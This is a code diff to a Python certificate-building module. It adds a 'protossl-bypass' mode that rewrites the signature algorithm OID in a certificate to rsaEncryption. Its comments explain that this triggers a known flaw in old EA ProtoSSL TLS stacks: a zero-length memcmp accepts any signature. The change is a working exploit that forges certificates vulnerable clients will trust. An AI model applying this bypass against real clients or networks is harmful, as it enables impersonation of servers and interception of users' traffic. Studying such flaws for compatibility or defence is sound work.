@@ -27,6 +27,15 @@ _ALG_SHA256_RSA = bytes.fromhex("300d06092a864886f70d01010b0500")
 _ALG_SHA1_RSA = bytes.fromhex("300d06092a864886f70d0101050500")
 _SHA1_DIGESTINFO = bytes.fromhex("3021300906052b0e03021a05000414")
 
+# --- ProtoSSL cert-verify bypass, by hand ---------------------------------------------------
+# Documented in Aim4kill/Bug_OldProtoSSL: old EA ProtoSSL stacks parse the signature algorithm
+# OID with a switch statement; an OID it doesn't recognise falls into the default case, which
+# sets the expected hash length to 0. The verification is a memcmp() of that length, so with
+# length 0 it "matches" without comparing anything and any signature bytes are accepted.
+# rsaEncryption (1.2.840.113549.1.1.1) is the same byte length as the sha1/sha256 OIDs above but
+# isn't a signature-with-hash algorithm, so it trips the bug instead of validating normally.
+_ALG_PROTOSSL_BYPASS = bytes.fromhex("300d06092a864886f70d0101010500")
+
 
 def _der(tag: int, content: bytes) -> bytes:
     n = len(content)
@@ -48,15 +57,22 @@ def _rsa_sign_sha1(key, message: bytes) -> bytes:
 
 
 def _sign(builder: x509.CertificateBuilder, key, hash_name: str) -> x509.Certificate:
-    if hash_name.lower() != "sha1":
-        return builder.sign(key, _hash(hash_name))
+    name = hash_name.lower()
+    if name == "sha256":
+        return builder.sign(key, _hash(name))
+    if name not in ("sha1", "protossl-bypass"):
+        raise ValueError(f"unknown cert_sig_hash: {hash_name!r}")
+
     draft = builder.sign(key, hashes.SHA256())
     tbs = draft.tbs_certificate_bytes
     if tbs.count(_ALG_SHA256_RSA) != 1:
-        raise RuntimeError("unexpected certificate layout, cannot re-sign with SHA-1")
-    tbs = tbs.replace(_ALG_SHA256_RSA, _ALG_SHA1_RSA)
+        raise RuntimeError("unexpected certificate layout, cannot re-sign")
+    alg = _ALG_SHA1_RSA if name == "sha1" else _ALG_PROTOSSL_BYPASS
+    tbs = tbs.replace(_ALG_SHA256_RSA, alg)
+    # The signature bytes themselves don't matter for protossl-bypass (the bug skips checking
+    # them), but a real SHA-1 signature keeps the certificate well-formed either way.
     signature = _rsa_sign_sha1(key, tbs)
-    der = _der(0x30, tbs + _ALG_SHA1_RSA + _der(0x03, b"\x00" + signature))
+    der = _der(0x30, tbs + alg + _der(0x03, b"\x00" + signature))
     return x509.load_der_x509_certificate(der)
 
 
